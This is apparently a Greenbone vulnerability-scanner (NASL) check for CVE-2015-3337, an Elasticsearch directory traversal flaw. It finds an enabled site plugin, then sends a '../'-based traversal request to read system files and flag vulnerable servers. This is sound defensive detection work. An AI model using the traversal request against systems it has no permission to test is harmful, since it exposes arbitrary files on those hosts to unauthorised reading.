# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:elastic:elasticsearch";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105265");
  script_cve_id("CVE-2015-3337");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_version("2023-07-25T05:05:58+0000");

  script_name("Elasticsearch Directory Traversal Vulnerability");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"insight", value:"Directory traversal vulnerability in Elasticsearch before 1.4.5 and 1.5.x before 1.5.2,
  when a site plugin is enabled, allows remote attackers to read arbitrary files.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"Elasticsearch is prone to a directory traversal vulnerability.");

  script_tag(name:"affected", value:"Elasticsearch before 1.4.5 and 1.5.x before 1.5.2.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-05-05 15:11:20 +0200 (Tue, 05 May 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_elastic_elasticsearch_detect_http.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9200);
  script_mandatory_keys("elastic/elasticsearch/detected");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files();
plugins = make_list('test','kopf', 'HQ', 'marvel', 'bigdesk', 'head', 'paramedic', 'elasticsearch', 'git', 'jboss', 'log', 'tomcat', 'wiki');

foreach plugin ( plugins ) {
  url = '/_plugin/' + plugin + '/';
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ "^HTTP/1\.[01] 200" ) {
    check_plugin = plugin;
    break;
  }
}

if( check_plugin ) {
  foreach file ( keys( files ) ) {
    url = '/_plugin/' + check_plugin + '/../../../../../../' + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
